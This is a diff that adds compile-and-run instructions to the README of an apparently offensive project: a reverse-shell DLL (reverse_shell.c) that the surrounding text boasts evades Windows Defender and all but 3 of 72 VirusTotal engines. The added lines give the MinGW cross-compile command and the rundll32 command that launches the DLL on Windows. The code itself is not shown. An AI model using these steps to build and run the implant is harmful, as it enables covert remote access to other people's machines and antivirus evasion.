@@ -13,6 +13,24 @@ During testing, **Windows 10 and Windows 11 did not flag this DLL as malicious**
 Additionally, when uploaded to **VirusTotal**, the file received **only 3 detections out of 72 antivirus engines**, indicating that many security solutions failed to recognize it as a threat. 
 ![VirusTotal Scan](virus_total.png)
 
+## How to Compile and Run
+
+### **Compiling the C File to a DLL**  
+
+To compile the provided C file (`reverse_shell.c`) into a DLL on a Linux system using **MinGW**, use the following command:  
+
+```bash
+x86_64-w64-mingw32-gcc -shared -o reverse_shell.dll reverse_shell.c -lws2_32
+```
+
+### Running the DLL on Windows
+
+Once the DLL is compiled, you can run it on a Windows System using the following command:
+```bash
+rundll32.exe .\reverse_shell.dll reverse_shell
+```
+![Windows Execution](windows_cmd.png)
+
 ## Understanding the Code
 
 ### Winsock Initialization
